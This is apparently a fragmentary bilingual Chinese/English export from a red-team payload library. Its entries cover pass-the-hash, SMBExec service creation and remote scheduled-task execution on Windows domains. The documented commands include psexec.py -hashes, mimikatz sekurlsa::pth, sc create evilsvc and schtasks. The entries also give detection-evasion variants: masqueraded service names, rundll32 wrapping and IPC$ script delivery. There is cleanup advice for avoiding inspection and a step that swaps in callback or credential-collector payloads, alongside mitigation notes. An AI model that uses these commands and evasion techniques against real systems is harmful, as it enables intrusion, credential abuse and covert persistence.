title.zh: 哈希批量喷洒圈定范围
title.en: Spray hashes to map reachable hosts

description.zh: 用 crackmapexec smb 携带 NTLM 哈希批量喷洒网段；标注 Pwn3D! 的主机清单即哈希可横行的目标范围。
description.en: Spray the segment with crackmapexec smb using the NTLM hash; hosts flagged Pwn3D! define where the hash grants access.

title.zh: 哈希直连拿下首个立足点
title.en: Claim the first foothold with the hash

description.zh: 对命中主机用 psexec.py -hashes 登录；返回 SYSTEM shell 即拿到域内首个受控节点，后续以此为跳板。
description.en: Log into a hit host with psexec.py -hashes; a SYSTEM shell is the first controlled node and the pivot for what follows.

title.zh: 注入哈希伪造登录会话
title.en: Forge a logon session with the hash

description.zh: 本机运行 mimikatz sekurlsa::pth 弹出新凭据进程；在该会话内直接访问目标资源即以哈希完成身份伪装。
description.en: Run mimikatz sekurlsa::pth locally to spawn a credentialed process; accessing targets from that session impersonates the identity with just the hash.

title.en: Access restricted shares with the hash

description.zh: 用 Invoke-SMBClient 以哈希连接目标并列出目录；成功读写文件即确认哈希对 SMB 资源完整有效，可拖取敏感文档。
description.en: Connect with Invoke-SMBClient using the hash and list shares; successful read/write confirms the hash fully works against SMB and sensitive files can be pulled.

overview.zh: NTLM Hash 登录防护验证覆盖哈希传递场景：针对已获取 NTLM 哈希但无明文口令的测试主体，验证能否以哈希直接完成认证并访问目标。验证维度涵盖 psexec 远程执行、crackmapexec 批量验证、sekurlsa::pth 进程注入与 PowerShell SMB 客户端四种利用面。
overview.en: NTLM Hash Logon Protection Validation covers pass-the-hash: for a test principal holding an NTLM hash without the plaintext password, verify whether the hash alone authenticates and grants access. Verification dimensions cover psexec remote execution, crackmapexec batch validation, sekurlsa::pth process injection, and a PowerShell SMB client.

vulnerability.zh: 根因是 NTLM 协议把哈希本身当作认证凭据，响应由 NTLM 哈希直接参与计算，任何拿到哈希的主体无需破解即可完成认证；未启用 SMB 签名与账号隔离时，本地管理员哈希跨机复用进一步放大横向移动前景。
vulnerability.en: The root cause is that the NTLM protocol treats the hash itself as the credential — the challenge response is computed directly from the NTLM hash — so anyone holding it authenticates without cracking; without SMB signing and account isolation, cross-machine reuse of local-admin hashes further amplifies lateral movement prospects.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 psexec.py -hashes 直接开 shell，目标出现 4624 网络登录（LogonType 3）即确认成功；第 2 步用 crackmapexec smb 验证哈希有效性，返回 Pwn3d! 即确认具备本地管理员权限；第 3 步用 sekurlsa::pth 启动携带注入凭据的新进程访问域资源（本机 4624 表现为 NewCredentials 类型）；第 4 步用 Invoke-SMBClient 以哈希经 -Source \\{LAB_HOST}\admin$ 列出共享内容。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 opens a shell directly with psexec.py -hashes — a 4624 NewCredentials logon on the target confirms success; step 2 validates the hash with crackmapexec smb — Pwn3d! output confirms local administrator rights; step 3 uses sekurlsa::pth to launch a new process carrying the injected credential and reach domain resources; step 4 lists target shares with Invoke-SMBClient using the hash. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用 SMB 签名与 EPA，实施本地管理员隔离策略（禁止本地管理员跨机复用、LAPS 随机化），对敏感账号禁用 NTLM 并审计 4624 NewCredentials 类型登录。修复后用第 1、2 步样例回归，哈希认证应被目标直接拒绝。
mitigation.en: Enable SMB signing and EPA, enforce local-admin isolation (no cross-machine reuse, LAPS randomization), disable NTLM for sensitive accounts, and audit 4624 NewCredentials logons. After the fix, regress with the step 1 and step 2 samples: hash authentication must be rejected by the target.

title.en: SMBExec Remote-Service Write Protection Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_SMBEXEC_E_1 与蓝队日志；成功时获得半交互 shell，命令输出经 SMB 返回。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_SMBEXEC_E_1 with blue-team logs; a semi-interactive shell with command output returned over SMB confirms success.

title.zh: SMBExec 远程服务写入防护校正命令 2
title.en: SMBExec Remote-Service Write Protection Reviewed Command 2

execution.command:
sc \\{LAB_HOST} create evilsvc binPath= "cmd /c whoami"
sc \\{LAB_HOST} start evilsvc
sc \\{LAB_HOST} delete evilsvc

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_SMBEXEC_E_2 与蓝队日志；成功时服务创建并执行 whoami，蓝队可见 7045 服务创建与删除事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_SMBEXEC_E_2 with blue-team logs; the service created and running whoami with events 7045 showing creation and deletion confirms success.

analysis.en: SMBExec Remote-Service Write Protection is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过对 smbexec 默认服务名的规则匹配：伪装时间同步类服务名。成功判据：shell 建立且服务名无告警。
description.en: Evades rule matching on smbexec's default service name by masquerading as a time-sync style service. Success: shell establishes with no alert on the service name.

title.zh: rundll32 包装执行规避变体

wafBypass.command: sc \\{LAB_HOST} create W32Sync binPath= "rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL cmd.dll" && sc \\{LAB_HOST} start W32Sync

description.zh: 绕过 binPath 直接 cmd.exe 的服务创建检测：以 rundll32 包装间接拉起。成功判据：服务启动且命令执行。
description.en: Evades service-creation detection on a direct cmd.exe binPath by wrapping indirect launch through rundll32. Success: service starts and the command executes.

wafBypass.command: net use \\{LAB_HOST}\IPC$ /user:{LAB_DOMAIN}\{LAB_USER} {LAB_PASSWORD} && copy output.bat \\{LAB_HOST}\IPC$\ && sc \\{LAB_HOST} create SysH binPath= "cmd /c \\{LAB_HOST}\IPC$\output.bat"

description.zh: 绕过 admin$ 共享专用的落盘监控：改走 IPC$ 命名管道共享传递脚本。成功判据：脚本经 IPC$ 执行成功。
description.en: Evades admin$-specific drop monitoring by delivering the script over the IPC$ named-pipe share instead. Success: the script executes via IPC$.

description.zh: 确认手握目标管理员口令或 NTLM 哈希，且 445 端口可达、ADMIN$ 可写；条件齐备即可走服务创建方式横向。
description.en: Hold an admin password or NTLM hash for the target, with port 445 reachable and ADMIN$ writable; with these met, service-creation lateral movement is viable.

description.zh: 用 smbexec.py 以口令或哈希登录目标；返回管理员级半交互 shell、命令经共享目录中转即服务化横向通道建立。
description.en: Log in with smbexec.py using password or hash; an admin-level shell with commands relayed through a share establishes the service-based lateral channel.

title.zh: 原生服务落地持久执行

description.zh: 用 sc \目标 create evilsvc binPath= "cmd /c whoami" 创建服务；sc query 显示服务存在且创建成功即通道打通，随后修改 binPath 指向其他命令即可执行任意载荷。
description.en: Create evilsvc via sc \\target create ... binPath= "cmd /c whoami"; a created, runnable service only needs a new binPath to carry any payload.

attackChain.payload:
sc \\{LAB_HOST} create evilsvc binPath= "cmd /c whoami"
sc \\{LAB_HOST} start evilsvc
sc \\{LAB_HOST} delete evilsvc

description.zh: 用 sc delete 移除 evilsvc 并清理 smbexec 中转残留文件；通道用后即焚，避免巡检时发现异常服务项。
description.en: Remove evilsvc with sc delete and clear smbexec relay leftovers; burning the channel after use avoids anomalous services surfacing in inspection.

attackChain.payload:
sc \\{LAB_HOST} create evilsvc binPath= "cmd /c whoami"
sc \\{LAB_HOST} start evilsvc
sc \\{LAB_HOST} delete evilsvc

overview.zh: SMBExec 远程服务写入防护覆盖 SMB 服务控制场景：针对持有目标管理员凭据的测试主体，验证能否经 SMB 写入并启动远程服务获得命令执行。验证维度涵盖 smbexec.py 自动化半交互 shell 与 sc 原生命令手动创建、启动、删除的完整流程。
overview.en: SMBExec Remote-Service Write Protection covers SMB service control: for a test principal holding target administrator credentials, verify whether a remote service can be written and started over SMB for command execution. Verification dimensions cover the automated semi-interactive smbexec.py shell and the manual sc create/start/delete workflow.

vulnerability.zh: 根因是 ADMIN$ 共享与服务控制管理器允许管理员主体远程创建服务，服务 binPath 可指向任意命令行；smbexec 借此把命令输出经 SMB 管道回传，形成不留盘上文件的执行通道，7045 服务创建事件是主要审计痕迹。
vulnerability.en: The root cause is that the ADMIN$ share and the Service Control Manager let administrators create services remotely with binPath pointing at arbitrary command lines; smbexec pipes command output back over SMB, yielding a fileless execution channel whose primary audit trace is the 7045 service-creation event.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 smbexec.py 建立半交互 shell，命令输出经 SMB 返回即确认成功；第 2 步用 sc \HOST create/start/delete 手动复现：创建 evilsvc 指向 cmd /c whoami，启动后回收输出，再删除服务清理痕迹，目标侧对应 7045 创建与删除事件。该路径无需落盘，适合批量横向前验证凭据有效性。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 runs smbexec.py for a semi-interactive shell — command output returning over SMB confirms success; step 2 replays manually with sc \HOST create/start/delete: create evilsvc pointing at cmd /c whoami, start it to capture output, then delete the service, matching 7045 create/delete events on the target. The path is fileless and suits credential validation before batch lateral movement. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制 ADMIN$ 与服务控制远程访问到管理网段专用账号，启用 SMB 签名，实施本地管理员隔离与 LAPS 轮换；对 7045 服务创建事件建立实时告警并审计 binPath 内容。修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict ADMIN$ and service-control remote access to dedicated management-segment accounts, enable SMB signing, and enforce local-admin isolation with LAPS rotation; build real-time alerts on 7045 service-creation events and audit binPath contents. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

description.zh: 用 schtasks /create /s 目标 /tn evil /tr "cmd /c whoami" /sc once 创建单次任务；任务列表出现 evil 且到点运行即载荷送达目标。
description.en: Create the once-scheduled evil task on the target with schtasks /create; the task appearing in the list and firing on schedule confirms payload delivery.

description.zh: 把 /tr 参数指向回连程序或凭据收集脚本并加 /f 重新创建同名任务；目标主机按计划执行新载荷即获得可持续利用的命令执行通道。
description.en: Repoint /tr at a callback binary or credential collector and recreate the task; the target executing the new payload on schedule yields a persistent execution channel.

description.zh: 用 schtasks /delete /s {LAB_HOST} /tn evil /f 清理目标上已执行的任务；计划任务面板与日志不再残留条目即横向动作收尾完成。
description.en: Remove the executed task with schtasks /delete /tn evil; no leftover entries in the panel or logs closes out the lateral action.

overview.zh: 远程计划任务授权验证覆盖计划任务远程执行场景：针对持有目标管理员凭据的测试主体，验证能否经任务计划程序管道远程注册一次性任务并回传命令输出。验证维度涵盖 atexec.py 自动化路径与 schtasks 原生命令两条入口。
overview.en: Remote Scheduled-Task Authorization Validation covers remote scheduled-task execution: for a test principal holding target administrator credentials, verify whether one-shot tasks can be registered remotely via the Task Scheduler pipe and return command output. Verification dimensions cover the automated atexec.py path and the native schtasks command.

vulnerability.zh: 根因是任务计划程序服务允许管理员主体通过 ATSVC 管道远程注册任务，任务默认以 SYSTEM 执行且一次性触发后不留常驻项；缺少 4698 任务创建监控时，该通道近乎静默，适合作为横向执行的低痕迹入口。
vulnerability.en: The root cause is that the Task Scheduler service lets administrators register tasks remotely via the ATSVC pipe; tasks run as SYSTEM and leave no resident item after a one-shot trigger. Without 4698 task-creation monitoring the channel is nearly silent, making it a low-footprint lateral-execution entry.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 atexec.py 远程执行 whoami，任务触发后回传输出且目标可见 4698 事件即确认成功；第 2 步用 schtasks /create /s 指定一次性触发时间复现，观察 4698/4699 事件对。两条路径均以 SYSTEM 执行且即时清理，适合验证凭据有效性与命令回传链路后转为其他持久化手段。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 executes whoami remotely with atexec.py — returned output after the task fires plus a 4698 event on the target confirms success; step 2 replays with schtasks /create /s using a one-shot trigger time and observes the 4698/4699 event pair. Both paths run as SYSTEM and self-clean, suiting credential validation and command-return checks before switching to other persistence. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 限制任务计划程序远程管理到管理网段专用账号，收紧远程任务注册权限，对 4698/4699 事件建立告警并审计任务 XML 中的异常命令行。修复后用第 1 步样例回归，远程任务注册应返回拒绝错误。
mitigation.en: Restrict Task Scheduler remote management to dedicated management-segment accounts, tighten remote task registration rights, alert on 4698/4699 events, and audit task XML for anomalous command lines. After the fix, regress with the step 1 sample: remote task registration must return an access-denied error.
